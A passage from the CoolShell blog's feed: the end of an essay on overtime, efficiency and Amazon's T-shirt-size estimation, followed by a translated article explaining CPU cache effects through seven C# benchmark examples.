<strong>工作狂往往不得要领。他们花大把大把的时间去解决问题，他们以为能靠蛮力来弥补思维上的惰性，其结果就是折腾出一堆粗糙无用的解决方案</strong>。</li>
</ul>
<p>就像人肉手动的织布机一样，当面对大量订单的时候，一个简单粗暴的方法就是拼命地加人和拼命地工作来换取更大的生产力。只有你在人手不够或是人力成本太高的情况下，你才会去想是不是可以优化一下工具，制造一个更有效率更有生产力的工具。</p>
<p><strong>在中国，劳动力的成本不高，而管理者们的智力和能力有限，所以，在这个环境下，尤其在KPI和数字的重压下，管理者们是非常非常容易想到需要靠加人或是加班来提高产能的</strong>。所以，他们放弃了知识密集型的创新，而采用了劳动密集型的简单粗暴的方式，长期下来，导致了自己再也不会思考，导致了只会使用人肉解决问题。</p>
<p>于是，当全自动化的织布机出现的时候，这种劳动密集型的公司分分钟就成为了历史。这样的例子太多太多了，看看历史就知道了。</p>
<p>当然，有时候，我们需要冲刺还是要适当偶尔加班的，但这绝对不应该是常态和长期的，不然，这必然是一种饮鸩止渴的行为。</p>
<p>另外，我还要多说几种情况：</p>
<p style="padding-left: 30px;">1）如果你的员工就像在《<a title="软件公司的两种管理方式" href="https://coolshell.cn/articles/4951.html" target="_blank">软件公司的两种管理</a>》中所说的，像Widget Factories那样，净是些X型的人的话，那么，你也只有使用加班和加人这种方式，就像长城和金字塔的建设过程一样，就像富士康一样，你的团队本质是不会思考只能用鞭子去抽他们的方式去管理。于是，你也只能用“狼性”来呼唤你的员工像那些低智商的野兽一样的行事。</p>
<p style="padding-left: 30px;">2）有时候，我们需要去“卡位”，需要很快地去实现一个东西占领市场，这需要加班。就像Win95和Intel的奔腾芯片的浮点数问题一样。但是千万不要忘了，你在卡完位后，得马上把你产品的质量搞上去，不然，你一样会死得很难看。（Windows是有两个团队的，一个团队是用来占领市场的，另一个团队是安心搞发展的）注意：“卡位”从某种程度上来说应该是一种有价值的事，但我们依然要思考是否在用蛮力行事。</p>
<p style="padding-left: 30px;">3）另外，有的人工作就是生活，生活就是工作，所以，对他来说，这不是一种工作，而是一种事业。我认可这样的精神和热情，但是，我还是想让这样的人反思一下自己，有没有用一种更为聪明的方式来从事自己的事业？而不是用蛮力。</p>
<p>无论上述的哪种情况，我们都可以看到，只要你进入了劳动密集型，靠人和靠加班来解决问题，并沉迷并深 陷其中不能自拔，那们，你终有一天会玩到尽头的。</p>
<h4>关于效率</h4>
<p><strong>很多人不知道什么叫效率，他们以为效率就是：单位时间单位人数下干更多的活。这是错的！效率不是比谁干的活多，而是比谁干得活有更大的价值</strong>。效率的物理公式是：<span style="color: #ff0000;"><strong>有用功/总功</strong></span>。<span style="color: #000000;">换句话说，效率就是：单位时间和人数产生的价值</span>。所以，提高效率，并不是加人，也不是干更多的活，而是，你这么多人干出来了多少有价值的东西。</p>
<p>有了公式，我们也就知道怎么来提高效率了。</p>
<p><strong>1）增加有用功</strong></p>
<ul>
<li>你得多问问你的需求方，为什么要加这个需求？干这个事到底有多大的价值？能让多少人受益？</li>
<li>你得多问问你的需求方，能不能稍微简化一下需求，这样可以让我付出的努力更少一些？</li>
<li>你得要多去思考一下，你是在干一个建筑队的活呢？还是在干一个装修队的活？</li>
<li>你得要多去思考一下，业务上和用户的最大的痛点是什么？</li>
</ul>
<p>关于增加有用功，再说两点：</p>
<ul>
<li>像乔布斯那样，告诉你的产品经理或是业务方，你现在提的10需求，我只能做3个，会是哪3个？为什么是这3个？<strong>有用功的来源不是拼命做需求，而是砍需求。</strong>
</li>
</ul>
<ul>
<li>
<strong>关于创造价值，我们要干的不是像百度的“竞价排名”那样，把钱从别人口袋里搬运到自己的口袋里，而是要像“英国工业革命”或是“硅谷”那样，把价值真正的创造出来</strong>。</li>
</ul>
<p><strong>2）降低总功</strong></p>
<ul>
<li><span style="line-height: 13px;">你得多问问自己，你有多少时间是在干一些支持性而不是产出性的工作？</span></li>
<li>你得多问问自己，有没有残酷无情地减少重复劳动的劳动密集型的工作？</li>
<li>你得多问问自己，自己的管理者和员工的能力和素质有没有在降低你的团队执行的成本？</li>
</ul>
<p><strong>3）形成合力</strong></p>
<p>有一个很不错的产品经理对我说，他看了南京那两个小女孩被饿死的消息，感到很震惊。与之有关联的每一方都说自己尽力，但是最终结果人还是饿死了，你几乎不敢相信这是真的。</p>
<p>但是，类比一下我们的项目，这种事似乎又发生在我们的公司当中，尤其是大公司中。每一个团队都说自己尽力了，结果项目就是没做好，底层团队说自己只干底层，已经尽力了，前端说自己只负责前端，也尽力了，后端说自己只管后端，不管前端和底层，运维说对于这样的设计和部署自己也尽力了，产品经理，运营都这样说，自己尽力了。你会发现，你几乎很难批评他们，因为他们的确如他们所说的那样，把他们自己的那块都做得很好了，而且的确做得很好了。但是，最终的结果却是：整个产品问题很多。</p>
<p><strong>所以说，效率不是每个团队各自的效率，而是整个团队对整个产品负责的共同使命，这样才会现整体的效率。没有整体的效率，只有个体的效率，最终也等于没有效率</strong>。</p>
<h4>T-Shirt Size Estimation</h4>
<p>Amazon用一种T-Shirt Size 估计的方式来做项目。</p>
<ul>
<li>产品经理会对每一条需求评估上业务影响力的尺寸，如：XXXL 影响一千万人以上或是可以占到上亿美金的市场，XXL，影响百万用户或是占了千万金级别以上的市场，后面还有XL，L，M，S，这样下来。</li>
</ul>
<ul>
<li>开发团队也一样，要评估投入的人员时间成本，XXXL表示要干1年，XXL干半年，XL干3个月，L干两个月，M干一个月，S干两周以下。等等。</li>
</ul>
<p>于是，</p>
<ul>
<li>当业务影响力是XL，时间人员成本是S，这是最高优先级。</li>
<li>当业务影响力是M，时间人员成本是M，这是低优先级。</li>
<li>当业务影响力是S，时间人员成本是XL，直接砍掉这个需求。因为是亏的。</li>
<li>当业务影响力是XXL，时间人员成本是XXL，需要简化需求，把需求简化成XL，时间人员成本变成M以下。</li>
</ul>
<p>大家感受一下吧。</p>
<p>好了，我就说这么多，欢迎大家讨论。</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-07-24T08:28:10+08:00</pubDate>
<guid>https://coolshell.cn/articles/10217.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 7个示例科普CPU Cache ]]></title>
<link>https://coolshell.cn/articles/10249.html</link>
<content><![CDATA[ 
<p><strong>（感谢网友 </strong><a href="https://weibo.com/fullofbull" target="_blank"><strong>@我的上铺叫路遥</strong></a><strong> 翻译投稿）</strong></p>
<p>CPU cache一直是理解计算机体系架构的重要知识点，也是并发编程设计中的技术难点，而且相关参考资料如同过江之鲫，浩瀚繁星，阅之如临深渊，味同嚼蜡，三言两语难以入门。正好网上有人推荐了微软大牛Igor Ostrovsky一篇博文<strong>《漫游处理器缓存效应》</strong>，文章不仅仅用7个最简单的源码示例就将CPU cache的原理娓娓道来，还附加图表量化分析做数学上的佐证，个人感觉这种案例教学的切入方式绝对是俺的菜，故而忍不住贸然译之，以飨列位看官。</p>
<p>原文地址：<a href="http://igoro.com/archive/gallery-of-processor-cache-effects/">Gallery of Processor Cache Effects</a></p>
<p>大多数读者都知道cache是一种快速小型的内存，用以存储最近访问内存位置。这种描述合理而准确，但是更多地了解一些处理器缓存工作中的“烦人”细节对于理解程序运行性能有很大帮助。</p>
<p>在这篇博客中，我将运用代码示例来详解cache工作的方方面面，以及对现实世界中程序运行产生的影响。</p>
<p>下面的例子都是用C#写的，但语言的选择同程序运行状况以及得出的结论几乎没什么影响。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E7%A4%BA%E4%BE%8B1%EF%BC%9A%E5%86%85%E5%AD%98%E8%AE%BF%E9%97%AE%E5%92%8C%E8%BF%90%E8%A1%8C" title="示例1：内存访问和运行">示例1：内存访问和运行</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E7%A4%BA%E4%BE%8B2%EF%BC%9A%E7%BC%93%E5%AD%98%E8%A1%8C%E7%9A%84%E5%BD%B1%E5%93%8D" title="示例2：缓存行的影响">示例2：缓存行的影响</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E7%A4%BA%E4%BE%8B3%EF%BC%9AL1%E5%92%8CL2%E7%BC%93%E5%AD%98%E5%A4%A7%E5%B0%8F" title="示例3：L1和L2缓存大小">示例3：L1和L2缓存大小</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E7%A4%BA%E4%BE%8B4%EF%BC%9A%E6%8C%87%E4%BB%A4%E7%BA%A7%E5%88%AB%E5%B9%B6%E5%8F%91" title="示例4：指令级别并发">示例4：指令级别并发</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E7%A4%BA%E4%BE%8B5%EF%BC%9A%E7%BC%93%E5%AD%98%E5%85%B3%E8%81%94%E6%80%A7" title="示例5：缓存关联性">示例5：缓存关联性</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E7%A4%BA%E4%BE%8B6%EF%BC%9A%E7%BC%93%E5%AD%98%E8%A1%8C%E7%9A%84%E4%BC%AA%E5%85%B1%E4%BA%ABfalse-sharing" title="示例6：缓存行的伪共享(false-sharing)">示例6：缓存行的伪共享(false-sharing)</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E7%A4%BA%E4%BE%8B7%EF%BC%9A%E7%A1%AC%E4%BB%B6%E5%A4%8D%E6%9D%82%E6%80%A7" title="示例7：硬件复杂性">示例7：硬件复杂性</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#%E5%85%B3%E4%BA%8E%E7%AC%AC7%E4%B8%AA%E4%BE%8B%E5%AD%90%E7%9A%84%E4%B8%80%E4%B8%AA%E5%9B%9E%E5%B8%96" title="关于第7个例子的一个回帖">关于第7个例子的一个回帖</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#PS%E4%B8%AA%E4%BA%BA%E6%84%9F%E6%82%9F-%E5%B1%80%E9%83%A8%E6%80%A7%E5%8E%9F%E7%90%86%E5%92%8C%E6%B5%81%E6%B0%B4%E7%BA%BF%E5%B9%B6%E5%8F%91" title="P.S.个人感悟——局部性原理和流水线并发">P.S.个人感悟——局部性原理和流水线并发</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-10" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99" title="参考资料">参考资料</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E7%A4%BA%E4%BE%8B1%EF%BC%9A%E5%86%85%E5%AD%98%E8%AE%BF%E9%97%AE%E5%92%8C%E8%BF%90%E8%A1%8C"></span>示例1：内存访问和运行<span class="ez-toc-section-end"></span>
</h4>
<p>你认为相较于循环1，循环2会运行多快？</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int[] arr = new int[64 * 1024 * 1024];

// Loop 1
for (int i = 0; i &lt; arr.Length; i++) arr[i] *= 3;

// Loop 2
for (int i = 0; i &lt; arr.Length; i += 16) arr[i] *= 3;</pre>
<p><span id="more-10249"></span></p>
<p>第一个循环将数组的每个值乘3，第二个循环将每16个值乘3，第二个循环只做了第一个约6%的工作，但在现代机器上，两者几乎运行相同时间：在我机器上分别是80毫秒和78毫秒。</p>
<p>两个循环花费相同时间的原因跟内存有关。<strong>循环执行时间长短由数组的内存访问次数决定的，而非整型数的乘法运算次数。</strong>经过下面对第二个示例的解释，你会发现硬件对这两个循环的主存访问次数是相同的。</p>
<h4>
<span class="ez-toc-section" id="%E7%A4%BA%E4%BE%8B2%EF%BC%9A%E7%BC%93%E5%AD%98%E8%A1%8C%E7%9A%84%E5%BD%B1%E5%93%8D"></span>示例2：缓存行的影响<span class="ez-toc-section-end"></span>
</h4>
<p>让我们进一步探索这个例子。我们将尝试不同的循环步长，而不仅仅是1和16。</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">for (int i = 0; i &lt; arr.Length; i += K) arr[i] *= 3;</code></p>
<p>下图为该循环在不同步长(K)下的运行时间：</p>
<p><img alt="image placeholder" ></p>
<p>注意当步长在1到16范围内，循环运行时间几乎不变。但从16开始，每次步长加倍，运行时间减半。</p>
<p>背后的原因是今天的CPU不再是按字节访问内存，而是以64字节为单位的块(chunk)拿取，称为一个缓存行(cache line)。当你读一个特定的内存地址，整个缓存行将从主存换入缓存，并且访问同一个缓存行内的其它值的开销是很小的。</p>
<p>由于16个整型数占用64字节（一个缓存行），for循环步长在1到16之间必定接触到相同数目的缓存行：即数组中所有的缓存行。当步长为32，我们只有大约每两个缓存行接触一次，当步长为64，只有每四个接触一次。</p>
<p>理解缓存行对某些类型的程序优化而言可能很重要。比如，数据字节对齐可能决定一次操作接触1个还是2个缓存行。那上面的例子来说，很显然操作不对齐的数据将损失一半性能。</p>
<h4>
<span class="ez-toc-section" id="%E7%A4%BA%E4%BE%8B3%EF%BC%9AL1%E5%92%8CL2%E7%BC%93%E5%AD%98%E5%A4%A7%E5%B0%8F"></span>示例3：L1和L2缓存大小<span class="ez-toc-section-end"></span>
</h4>
<p>今天的计算机具有两级或三级缓存，通常叫做L1、L2以及可能的L3（译者注：如果你不明白什么叫二级缓存，可以参考<a href="https://coolshell.cn/articles/3236.html" target="_blank">这篇精悍的博文</a>lol）。如果你想知道不同缓存的大小，你可以使用系统内部工具<a href="https://technet.microsoft.com/en-us/sysinternals/cc835722.aspx" target="_blank">CoreInfo</a>，或者Windows API调用<a href="https://msdn.microsoft.com/en-us/library/ms683194(VS.85).aspx" target="_blank">GetLogicalProcessorInfo</a>。两者都将告诉你缓存行以及缓存本身的大小。</p>
<p>在我的机器上，CoreInfo现实我有一个32KB的L1数据缓存，一个32KB的L1指令缓存，还有一个4MB大小L2数据缓存。L1缓存是处理器独享的，L2缓存是成对处理器共享的。</p>
<p>Logical Processor to Cache Map:<br>
*— Data Cache 0, Level 1, 32 KB, Assoc 8, LineSize 64<br>
*— Instruction Cache 0, Level 1, 32 KB, Assoc 8, LineSize 64<br>
-*– Data Cache 1, Level 1, 32 KB, Assoc 8, LineSize 64<br>
-*– Instruction Cache 1, Level 1, 32 KB, Assoc 8, LineSize 64<br>
**– Unified Cache 0, Level 2, 4 MB, Assoc 16, LineSize 64<br>
–*- Data Cache 2, Level 1, 32 KB, Assoc 8, LineSize 64<br>
–*- Instruction Cache 2, Level 1, 32 KB, Assoc 8, LineSize 64<br>
—* Data Cache 3, Level 1, 32 KB, Assoc 8, LineSize 64<br>
—* Instruction Cache 3, Level 1, 32 KB, Assoc 8, LineSize 64<br>
–** Unified Cache 1, Level 2, 4 MB, Assoc 16, LineSize 64</p>
<p>（译者注：作者平台是四核机，所以L1编号为0~3，数据/指令各一个，L2只有数据缓存，两个处理器共享一个，编号0~1。关联性字段在后面例子说明。）</p>
<p>让我们通过一个实验来验证这些数字。遍历一个整型数组，每16个值自增1——一种节约地方式改变每个缓存行。当遍历到最后一个值，就重头开始。我们将使用不同的数组大小，可以看到当数组溢出一级缓存大小，程序运行的性能将急剧滑落。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int steps = 64 * 1024 * 1024;
// Arbitrary number of steps
int lengthMod = arr.Length - 1;
for (int i = 0; i &lt; steps; i++)
{
    arr[(i * 16) &amp; lengthMod]++; // (x &amp; lengthMod) is equal to (x % arr.Length)
}</pre>
<p>下图是运行时间图表：<br>
<img alt="image placeholder" ></p>
<p>你可以看到在32KB和4MB之后性能明显滑落——正好是我机器上L1和L2缓存大小。</p>
<h4>
<span class="ez-toc-section" id="%E7%A4%BA%E4%BE%8B4%EF%BC%9A%E6%8C%87%E4%BB%A4%E7%BA%A7%E5%88%AB%E5%B9%B6%E5%8F%91"></span>示例4：指令级别并发<span class="ez-toc-section-end"></span>
</h4>
<p>现在让我们看一看不同的东西。下面两个循环中你以为哪个较快？</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int steps = 256 * 1024 * 1024;
int[] a = new int[2];

// Loop 1
for (int i=0; i&lt;steps; i++) { a[0]++; a[0]++; }

// Loop 2
for (int i=0; i&lt;steps; i++) { a[0]++; a[1]++; }</pre>
<p>结果是第二个循环约比第一个快一倍，至少在我测试的机器上。为什么呢？这跟两个循环体内的操作指令依赖性有关。</p>
<p>第一个循环体内，操作做是相互依赖的（译者注：下一次依赖于前一次）：<br>
<img alt="image placeholder" ><br>
但第二个例子中，依赖性就不同了：<br>
<img alt="image placeholder" ></p>
<p>现代处理器中对不同部分指令拥有一点并发性（译者注：跟流水线有关，比如Pentium处理器就有U/V两条流水线，后面说明）。这使得CPU在同一时刻访问L1两处内存位置，或者执行两次简单算术操作。在第一个循环中，处理器无法发掘这种指令级别的并发性，但第二个循环中就可以。</p>
<p>[原文更新]：许多人在reddit上询问有关编译器优化的问题，像{ a[0]++; a[0]++; }能否优化为{ a[0]+=2; }。实际上，C#编译器和CLR JIT没有做优化——在数组访问方面。我用release模式编译了所有测试（使用优化选项），但我查询了JIT汇编语言证实优化并未影响结果。</p>
<h4>
<span class="ez-toc-section" id="%E7%A4%BA%E4%BE%8B5%EF%BC%9A%E7%BC%93%E5%AD%98%E5%85%B3%E8%81%94%E6%80%A7"></span>示例5：缓存关联性<span class="ez-toc-section-end"></span>
</h4>
<p>缓存设计的一个关键决定是确保每个主存块(chunk)能够存储在任何一个缓存槽里，或者只是其中一些（译者注：此处一个槽位就是一个缓存行）。</p>
<p>有三种方式将缓存槽映射到主存块中：</p>
<ol>
<li>
<strong>直接映射(Direct mapped cache)</strong><br>
每个内存块只能映射到一个特定的缓存槽。一个简单的方案是通过块索引chunk_index映射到对应的槽位(chunk_index % cache_slots)。被映射到同一内存槽上的两个内存块是不能同时换入缓存的。（译者注：chunk_index可以通过物理地址/缓存行字节计算得到）</li>
<li>
<strong>N路组关联(N-way set associative cache)</strong><br>
每个内存块能够被映射到N路特定缓存槽中的任意一路。比如一个16路缓存，每个内存块能够被映射到16路不同的缓存槽。一般地，具有一定相同低bit位地址的内存块将共享16路缓存槽。（译者注：相同低位地址表明相距一定单元大小的连续内存）</li>
<li>
<strong>完全关联(Fully associative cache)</strong><br>
每个内存块能够被映射到任意一个缓存槽。操作效果上相当于一个散列表。</li>
</ol>
<p>直接映射缓存会引发冲突——当多个值竞争同一个缓存槽，它们将相互驱逐对方，导致命中率暴跌。另一方面，完全关联缓存过于复杂，并且硬件实现上昂贵。N路组关联是处理器缓存的典型方案，它在电路实现简化和高命中率之间取得了良好的折中。</p>
<p><img alt="image placeholder" ><br>
（此图由译者给出，直接映射和完全关联可以看做N路组关联的两个极端，从图中可知当N=1时，即直接映射；当N取最大值时，即完全关联。读者可以自行想象直接映射图例，具体表述见参考资料。）</p>
<p>举个例子，4MB大小的L2缓存在我机器上是16路关联。所有64字节内存块将分割为不同组，映射到同一组的内存块将竞争L2缓存里的16路槽位。</p>
<p>L2缓存有65,536个缓存行（译者注：4MB/64），每个组需要16路缓存行，我们将获得4096个集。这样一来，块属于哪个组取决于块索引的低12位bit(2^12=4096)。<strong>因此缓存行对应的物理地址凡是以262,144字节(4096*64)的倍数区分的，将竞争同一个缓存槽。我机器上最多维持16个这样的缓存槽。</strong>（译者注：请结合上图中的2路关联延伸理解，一个块索引对应64字节，chunk0对应组0中的任意一路槽位，chunk1对应组1中的任意一路槽位，以此类推chunk4095对应组4095中的任意一路槽位，chunk0和chunk4096地址的低12bit是相同的，所以chunk4096、chunk8192将同chunk0竞争组0中的槽位，它们之间的地址相差262,144字节的倍数，而最多可以进行16次竞争，否则就要驱逐一个chunk）。</p>
<p>为了使得缓存关联效果更加明了，我需要重复地访问同一组中的16个以上的元素，通过如下方法证明：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">public static long UpdateEveryKthByte(byte[] arr, int K)
{
    Stopwatch sw = Stopwatch.StartNew();
    const int rep = 1024*1024; // Number of iterations – arbitrary
    int p = 0;
    for (int i = 0; i &lt; rep; i++)
    {
        arr[p]++;
        p += K;
        if (p &gt;= arr.Length) p = 0;
    }
    sw.Stop();
    return sw.ElapsedMilliseconds;
}</pre>
<p>该方法每次在数组中迭代K个值，当到达末尾时从头开始。循环在运行足够长（2^20次）之后停止。</p>
<p>我使用不同的数组大小（每次增加1MB）和不同的步长传入UpdateEveryKthByte()。以下是绘制的图表，蓝色代表运行较长时间，白色代表较短时间：<br>
<img alt="image placeholder" ><br>
蓝色区域（较长时间）表明当我们重复数组迭代时，更新的值无法同时放在缓存中。浅蓝色区域对应80毫秒，白色区域对应10毫秒。</p>
<p>让我们来解释一下图表中蓝色部分：</p>
<p><strong>1.为何有垂直线？</strong>垂直线表明步长值过多接触到同一组中内存位置（大于16次）。在这些次数里，我的机器无法同时将接触过的值放到16路关联缓存中。</p>
<p>一些糟糕的步长值为2的幂：256和512。举个例子，考虑512步长遍历8MB数组，存在32个元素以相距262,144字节空间分布，所有32个元素都会在循环遍历中更新到，因为512能够整除262,144（译者注：此处一个步长代表一个字节）。</p>
<p>由于32大于16，这32个元素将一直竞争缓存里的16路槽位。</p>
<p>（译者注：为何512步长的垂直线比256步长颜色更深？在同样足够多的步数下，512比256访问到存在竞争的块索引次数多一倍。比如跨越262,144字节边界512需要512步，而256需要1024步。那么当步数为2^20时，512访问了2048次存在竞争的块而256只有1024次。最差情况下步长为262,144的倍数，因为每次循环都会引发一个缓存行驱逐。）</p>
<p>有些不是2的幂的步长运行时间长仅仅是运气不好，最终访问到的是同一组中不成比例的许多元素，这些步长值同样显示为蓝线。</p>
<p><strong>2.为何垂直线在4MB数组长度的地方停止？</strong>因为对于小于等于4MB的数组，16路关联缓存相当于完全关联缓存。</p>
<p>一个16路关联缓存最多能够维护16个以262,144字节分隔的缓存行，4MB内组17或更多的缓存行都没有对齐在262,144字节边界上，因为16*262,144=4,194,304。</p>
<p><strong>3.为何左上角出现蓝色三角？</strong>在三角区域内，我们无法在缓存中同时存放所有必要的数据，不是出于关联性，而仅仅是因为L2缓存大小所限。</p>
<p>举个例子，考虑步长128遍历16MB数组，数组中每128字节更新一次，这意味着我们一次接触两个64字节内存块。为了存储16MB数组中每两个缓存行，我们需要8MB大小缓存。但我的机器中只有4MB缓存（译者注：这意味着必然存在冲突从而延时）。</p>
<p>即使我机器中4MB缓存是全关联，仍无法同时存放8MB数据。</p>
<p><strong>4.为何三角最左边部分是褪色的？</strong>注意左边0~64字节部分——正好一个缓存行！就像上面示例1和2所说，额外访问相同缓存行的数据几乎没有开销。比如说，步长为16字节，它需要4步到达下一个缓存行，也就是说4次内存访问只有1次开销。</p>
<p>在相同循环次数下的所有测试用例中，采取省力步长的运行时间来得短。</p>
<p>将图表延伸后的模型：<br>
<img alt="image placeholder" ></p>
<p>缓存关联性理解起来有趣而且确能被证实，但对于本文探讨的其它问题比起来，它肯定不会是你编程时所首先需要考虑的问题。</p>
<h4>
<span class="ez-toc-section" id="%E7%A4%BA%E4%BE%8B6%EF%BC%9A%E7%BC%93%E5%AD%98%E8%A1%8C%E7%9A%84%E4%BC%AA%E5%85%B1%E4%BA%ABfalse-sharing"></span>示例6：缓存行的伪共享(false-sharing)<span class="ez-toc-section-end"></span>
</h4>
<p>在多核机器上，缓存遇到了另一个问题——一致性。不同的处理器拥有完全或部分分离的缓存。在我的机器上，L1缓存是分离的（这很普遍），而我有两对处理器，每一对共享一个L2缓存。这随着具体情况而不同，如果一个现代多核机器上拥有多级缓存，那么快速小型的缓存将被处理器独占。</p>
<p><strong>当一个处理器改变了属于它自己缓存中的一个值，其它处理器就再也无法使用它自己原来的值，因为其对应的内存位置将被刷新(invalidate)到所有缓存。而且由于缓存操作是以缓存行而不是字节为粒度，所有缓存中整个缓存行将被刷新！</strong></p>
<p>为证明这个问题，考虑如下例子：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">private static int[] s_counter = new int[1024];
private void UpdateCounter(int position)
{
    for (int j = 0; j &lt; 100000000; j++)
    {
        s_counter[position] = s_counter[position] + 3;
    }
}</pre>
<p>在我的四核机上，如果我通过四个线程传入参数0,1,2,3并调用UpdateCounter，所有线程将花费4.3秒。</p>
<p>另一方面，如果我传入16,32,48,64，整个操作进花费0.28秒！</p>
<p>为何会这样？第一个例子中的四个值很可能在同一个缓存行里，每次一个处理器增加计数，这四个计数所在的缓存行将被刷新，而其它处理器在下一次访问它们各自的计数（译者注：注意数组是private属性，每个线程独占）将失去命中(miss)一个缓存。这种多线程行为有效地禁止了缓存功能，削弱了程序性能。</p>
<h4>
<span class="ez-toc-section" id="%E7%A4%BA%E4%BE%8B7%EF%BC%9A%E7%A1%AC%E4%BB%B6%E5%A4%8D%E6%9D%82%E6%80%A7"></span>示例7：硬件复杂性<span class="ez-toc-section-end"></span>
</h4>
<p>即使你懂得了缓存的工作基础，有时候硬件行为仍会使你惊讶。不用处理器在工作时有不同的优化、探试和微妙的细节。</p>
<p>有些处理器上，L1缓存能够并发处理两路访问，如果访问是来自不同的存储体，而对同一存储体的访问只能串行处理。而且处理器聪明的优化策略也会使你感到惊讶，比如在伪共享的例子中，以前在一些没有微调的机器上运行表现并不良好，但我家里的机器能够对最简单的例子进行优化来减少缓存刷新。</p>
<p>下面是一个“硬件怪事”的奇怪例子：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">private static int A, B, C, D, E, F, G;
private static void Weirdness()
{
    for (int i = 0; i &lt; 200000000; i++)
    {
        // do something...
    }
}</pre>
<p>当我在循环体内进行三种不同操作，我得到如下运行时间：</p>
<p><strong>           操作</strong>                    <strong>时间</strong><br>
A++; B++; C++; D++;     719 ms<br>
A++; C++; E++; G++;     448 ms<br>
A++; C++;                      518 ms</p>
<p>增加A,B,C,D字段比增加A,C,E,G字段花费更长时间，更奇怪的是，增加A,C两个字段比增加A,C,E,G执行更久！</p>
<p>我无法肯定这些数字背后的原因，但我怀疑这跟存储体有关，如果有人能够解释这些数字，我将洗耳恭听。</p>
<p>这个例子的教训是，你很难完全预测硬件的行为。你可以预测很多事情，但最终，衡量及验证你的假设非常重要。</p>
<h4>
<span class="ez-toc-section" id="%E5%85%B3%E4%BA%8E%E7%AC%AC7%E4%B8%AA%E4%BE%8B%E5%AD%90%E7%9A%84%E4%B8%80%E4%B8%AA%E5%9B%9E%E5%B8%96"></span>关于第7个例子的一个回帖<span class="ez-toc-section-end"></span>
</h4>
<p>Goz：我询问Intel的工程师最后的例子，得到以下答复：</p>
<p>“很显然这涉及到执行单元里指令是怎样终止的，机器处理存储-命中-加载的速度，以及如何快速且优雅地处理试探性执行的循环展开（比如是否由于内部冲突而多次循环）。但这意味着你需要非常细致的流水线跟踪器和模拟器才能弄明白。在纸上预测流水线里的乱序指令是无比困难的工作，就算是设计芯片的人也一样。对于门外汉来说，没门，抱歉！”</p>
<h4>
<span class="ez-toc-section" id="PS%E4%B8%AA%E4%BA%BA%E6%84%9F%E6%82%9F-%E5%B1%80%E9%83%A8%E6%80%A7%E5%8E%9F%E7%90%86%E5%92%8C%E6%B5%81%E6%B0%B4%E7%BA%BF%E5%B9%B6%E5%8F%91"></span>P.S.个人感悟——局部性原理和流水线并发<span class="ez-toc-section-end"></span>
</h4>
<p>程序的运行存在<strong>时间和空间上的局部性</strong>，前者是指只要内存中的值被换入缓存，今后一段时间内会被多次引用，后者是指该内存附近的值也被换入缓存。如果在编程中特别注意运用局部性原理，就会获得性能上的回报。</p>
<p>比如<strong>C语言中应该尽量减少静态变量的引用，</strong>这是因为静态变量存储在全局数据段，在一个被反复调用的函数体内，引用该变量需要对缓存多次换入换出，而如果是分配在堆栈上的局部变量，函数每次调用CPU只要从缓存中就能找到它了，因为堆栈的重复利用率高。</p>
<p>再比如<strong>循环体内的代码要尽量精简，</strong>因为代码是放在指令缓存里的，而指令缓存都是一级缓存，只有几K字节大小，如果对某段代码需要多次读取，而这段代码又跨越一个L1缓存大小，那么缓存优势将荡然无存。</p>
<p>关于<strong>CPU的流水线(pipeline)并发性</strong>简单说说，Intel Pentium处理器有两条流水线U和V，每条流水线可各自独立地读写缓存，所以可以在一个时钟周期内同时执行两条指令。但这两条流水线不是对等的，U流水线可以处理所有指令集，V流水线只能处理简单指令。</p>
<p>CPU指令通常被分为四类，第一类是常用的简单指令，像mov, nop, push, pop, add, sub, and, or, xor, inc, dec, cmp, lea，可以在任意一条流水线执行，只要相互之间不存在依赖性，完全可以做到指令并发。</p>
<p>第二类指令需要同别的流水线配合，像一些进位和移位操作，这类指令如果在U流水线中，那么别的指令可以在V流水线并发运行，如果在V流水线中，那么U流水线是暂停的。</p>
<p>第三类指令是一些跳转指令，如cmp,call以及条件分支，它们同第二类相反，当工作在V流水线时才能通U流水线协作，否则只能独占CPU。</p>
<p>第四类指令是其它复杂的指令，一般不常用，因为它们都只能独占CPU。</p>
<p>如果是汇编级别编程，<strong>要达到指令级别并发，必须要注重指令之间的配对。</strong>尽量使用第一类指令，避免第四类，还要在顺序上减少上下文依赖。</p>
<h4>
